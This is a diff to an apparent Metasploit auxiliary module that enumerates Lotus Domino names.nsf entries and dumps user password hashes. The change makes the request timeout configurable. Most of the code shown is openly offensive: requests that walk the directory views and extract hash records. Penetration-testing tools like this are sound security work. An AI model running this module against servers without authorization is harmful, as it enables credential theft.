@@ -19,13 +19,18 @@ class Metasploit3 < Msf::Auxiliary
       'License'        => MSF_LICENSE
     )
 
-  register_options(
-    [
-      OptString.new('NOTES_USER', [false, 'The username to authenticate as', '']),
-      OptString.new('NOTES_PASS', [false, 'The password for the specified username' ]),
-      OptString.new('URI', [false, 'Define the path to the names.nsf file', '/names.nsf']),
-    ], self.class)
+    register_options(
+      [
+        OptString.new('NOTES_USER', [ false, 'The username to authenticate as', '' ]),
+        OptString.new('NOTES_PASS', [ false, 'The password for the specified username' ]),
+        OptString.new('URI', [ false, 'Define the path to the names.nsf file', '/names.nsf' ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
+      ], self.class)
 
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -41,7 +46,7 @@ class Metasploit3 < Msf::Auxiliary
         res = send_request_raw({
           'method'  => 'GET',
           'uri'     => "#{$uri}\/$defaultview?Readviewentries",
-        }, 25)
+        }, timeout)
 
         if res.nil?
           print_error("Connection timed out")
@@ -86,7 +91,7 @@ class Metasploit3 < Msf::Auxiliary
         'method'  => 'POST',
         'uri'     => '/names.nsf?Login',
         'data'    => post_data,
-      }, 20)
+      }, timeout)
 
       if res.nil?
         print_error("http://#{vhost}:#{rport} - Connection timed out")
@@ -128,7 +133,8 @@ class Metasploit3 < Msf::Auxiliary
         'method'  => 'GET',
         'uri'     => "#{uri}\/$defaultview?Readviewentries",
         'cookie'  => cookie,
-      }, 25)
+      }, timeout)
+
       if (res and res.body)
         max = res.body.scan(/siblings=\"(.*)\"/)[0].join
 
@@ -137,7 +143,7 @@ class Metasploit3 < Msf::Auxiliary
             'method'  => 'GET',
             'uri'     => "#{uri}\/$defaultview?Readviewentries&Start=#{i}",
             'cookie'  => cookie,
-          }, 25)
+          }, timeout)
 
         viewId = res.body.scan(/unid="([^\s]+)"/)[0].join
         dump_hashes(viewId,cookie,uri)
@@ -157,7 +163,7 @@ class Metasploit3 < Msf::Auxiliary
         'method'  => 'GET',
         'uri'     => "#{uri}\/$defaultview/#{view_id}?OpenDocument",
         'cookie'  => cookie,
-      }, 25)
+      }, timeout)
 
       if (res and res.body)
         short_name = res.body.scan(/<INPUT NAME=\"ShortName\" TYPE=(?:.*) VALUE=\"([^\s]+)"/i).join
